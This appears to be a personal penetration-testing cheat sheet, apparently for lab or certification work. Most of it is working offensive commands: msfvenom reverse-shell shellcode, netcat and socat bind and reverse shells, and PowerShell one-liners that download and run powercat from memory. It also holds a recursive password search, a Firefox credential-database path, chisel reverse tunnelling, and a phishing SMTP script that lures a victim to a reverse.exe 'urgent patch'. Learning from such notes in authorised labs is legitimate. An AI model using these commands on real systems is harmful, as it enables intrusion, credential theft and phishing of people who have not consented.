# RESOURCES
## buffer overflow
#### x86 cheat sheet
https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

#### registers
##### ESP - Stack Pointer
**STACK** keeps track of most recently referenced location (top) of the stack, stores pointer to it

##### EBP - Base Pointer
**STACK** points to the top of the stack when a function is called, used by a function to access information from its own stack frame

##### EIP - Instruction Pointer
points to the next code instruction to be executed, directs the flow of a program

##### EAX - Accumulator Register
used for arithmetic, interrupt calls, logical instructions

##### EBX - Base Pointer
used as a pointer for memory access

##### ECX - Counter Register
used as loop counter

##### EDX - Data Register
used in I/O port access, arithmetic

##### ESI - Source Index
used for string and array copying

##### EDI - Destination Index Register
pointer addressing data and destination in string/array copying

#### MSFVenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
```

# COMMANDS
## netcat
#### file transfer
target machine
`nc -nlvp 9001 > incoming.exe`
local machine
`nc -nv IP.ADDR 9001 < EXAMPLE.exe`
(note: no output, must guess when upload complete)

#### bind shell
target
`nc -lnvp 9001 -e cmd.exe`
local
`nc -nv IP.ADDR 9001`

#### reverse shell
target
`nc -nv IP.ADDR 9001 -e /bin/bash`
local
`nc -lnvp 9001`

## socat
#### connecting
`socat - TCP4:10.11.0.22:110`

#### listener
host
`sudo socat TCP4-LISTEN:443 STDOUT`
local
`socat - TCP4:10.11.0.22:443`

#### file transfer
host
`sudo socat TCP4-LISTEN:443,fork file:EXAMPLE.txt`
local
`socat TCP4:10.11.0.4:443 file:EXAMPLE_NAME.txt,create`

#### reverse shell
local
`sudo socat -d -d TCP4-LISTEN:443 STDOUT`
target
`socat TCP4:10.11.0.22:443 EXEC:/bin/bash`

#### encrypted bind shells
create self-signed certificate
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
##windows
## one-liners
#### dir and file
list all files current dir
`get-childitem -hidden` 

search C:\ for password
`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`

base64
`certutil -encone/-decode <FILE> <OUTFILE>`

copy contents of file to clipboard
`Get-Content <FILENAME> | Set-Clipboard`

#### network file transfers
smb setup on nix
`$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`

create cred object
```
> $pass = convertto-securestring 'password1' -AsPlainText -Force`
> $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
> New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```

#### PowerShell New-Object
download file
`(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`

download a file and execute from memory with powercat
`IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`

#### PowerShell Invoke-WebRequest
`powershell Invoke-WebRequest -url http://10.10.10.10:9000/file.txt`

shorthand
`powershell IWR -url http://10.10.10.10:9000/file.txt -OutFile C:\\Windows\\temp\\file.txt`

### smb
localhost
`sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1

``` 
$pass = convertto-securestring 'password1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\LOCAL_KALI_IP\tools
cd dials:
```

### credentials
```
C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
```
sharpweb?
python cracker?

### file transfer



### chisel
\*nix local
`./chisel server --reverse -p 9001`

win remote
`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`



### msfvenom
generate shellcode, filtering out bad characters
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`


### smtp > netcat

smtp file contents:
```
HELO VICTIM
MAIL FROM: <rmurray@victim>
RCPT TO: <tharper@victim>
DATA
Subject: This is an urgent patch please install!

Please install this urgent patch

http://192.168.119.243:9002/reverse.exe

Sincerly, Ross

.
QUIT
```

`cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`

